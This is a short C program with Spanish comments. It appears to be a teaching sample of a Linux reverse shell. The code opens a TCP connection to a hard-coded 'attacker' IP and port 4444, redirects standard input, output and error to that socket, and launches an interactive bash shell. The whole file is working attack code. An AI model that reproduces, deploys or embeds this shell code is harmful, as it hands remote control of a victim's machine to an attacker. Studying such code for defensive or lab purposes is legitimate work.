#include <unistd.h> // redirige el flujo de I/O/S
#include <netinet/ip.h> // contiene las definiciones como AF_INET
#include <arpa/inet.h> // contiene funcion que convierte ip a estructura binaria
#include <sys/socket.h> // trabajar con socket linux
#include <stdio.h>
struct sockaddr_in attacker_address;

int main() {
    const char *attackerIP = "192.168.18.203";
    short int attackerPORT = 4444;

    // estructura de la direccion ip
    attacker_address.sin_family = AF_INET; // ipv4
    attacker_address.sin_port = htons(attackerPORT); // puerto al cual debe conectarse
    inet_aton(attackerIP, &attacker_address.sin_addr); // ip del atacante

    // creacion del socket
    int main_socket = socket(
        AF_INET, //ipv4
        SOCK_STREAM, // protocolo tcp para ipv4/6
        0 // equivalente IPPROTO_TCP, en este caso el sistema elige por predeterminado los 2 args
    );

    // establecemos conexion 
    connect(
        main_socket, // identificador del socket
        (struct sockaddr *)&attacker_address, // configuracion de la direccion,
        //en windows -> typdef struct sockaddr SOCKADDR ->  struct sockaddr = SOCKADDR
        sizeof(attacker_address) // tamaño en bytes de la configuracion
    );

    //redirigimos la entrada/salida/error al main_socket
    for(int i=0; i<3; i++) {
        // 1 -> input
        // 2 -> output
        // 3 -> error
        dup2(main_socket, i);
    }
    char *args[] = {"/bin/bash", "-i", NULL};
    //ejecutamos la shell donde su I/O/E seran redirigos al socket
    execve(
        "/bin/bash", //ruta del ejecutable
        args, // argumentos para el programa -i
        NULL // no hay variable de entorno, como PATH, HOME, USER, etc
    );
    // execve reemplaza el proceso actual por el /bin/sh, distinto a system donde espera a que termine el comando
    return 0;
}
